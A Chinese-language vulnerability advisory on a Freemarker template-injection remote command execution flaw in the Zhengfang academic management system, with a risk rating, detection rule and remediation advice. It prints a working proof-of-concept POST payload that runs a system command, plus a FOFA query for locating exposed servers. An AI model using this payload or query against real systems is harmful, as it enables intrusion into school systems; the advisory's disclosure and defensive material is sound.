# 正方软件股份有限公司教务系统zdytj_cxParserColumnWhithSQL2存在远程命令执行漏洞

正方软件股份有限公司教务系统zdytj_cxParserColumnWhithSQL2存在远程命令执行漏洞

# 影响版本

目前已有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa: body=&quot;正方软件股份有限公司&quot; &amp;&amp; title=&quot;教学管理信息服务平台&quot;**

**POC/EXP：**

**step1** **源码泄露漏洞**

```
POST /zdytj/zdytj_cxParserColumnWhithSQL2.html HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

tjsql=select '<#assign x="freemarker.template.utility.Execute"?new()><#assign r=x("id")>' col_${r?replace("[^a-zA-Z0-9]","_","r")} from dual
```

​![image](assets/image-20260902005124-78ulcfr.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"正方教务系统 - /zdytj/zdytj_cxParserColumnWhithSQL2.html 远程命令执行漏洞 (Freemarker注入)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/zdytj/zdytj_cxParserColumnWhithSQL2.html"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"tjsql="; nocase;
    http.request_body; content:"freemarker.template.utility.Execute"; nocase; distance:0;
    metadata:
        service http,
        affected_product "正方教务系统",
        vulnerability_type "Remote Command Execution (Freemarker)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000753;
    rev:1;
    priority:1;
)
```

# 漏洞修复

1. **联系厂商获取官方补丁**  
    这是最安全彻底的方案。请立即联系**正方软件股份有限公司**官方技术支持，确认漏洞影响并提供修复补丁。官方网址为：[`http://www.zfsoft.com`](http://www.zfsoft.com/)​。
2. **临时加固措施（升级前）**

    * **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对**  **​`/zdytj/zdytj_cxParserColumnWhithSQL2.html`​**​ **接口的异常请求**，特别是 `tjsql`​ 参数中包含 `<#assign`​、`freemarker`​、`Execute`​ 等特征的请求。
    * **限制网络访问**：通过防火墙策略，**严格限制该系统仅允许内网或特定可信IP访问**。
    * **加强监控审计**：**检查系统访问日志**，重点排查对上述接口的可疑访问，尤其是包含Freemarker模板代码的请求。

‍
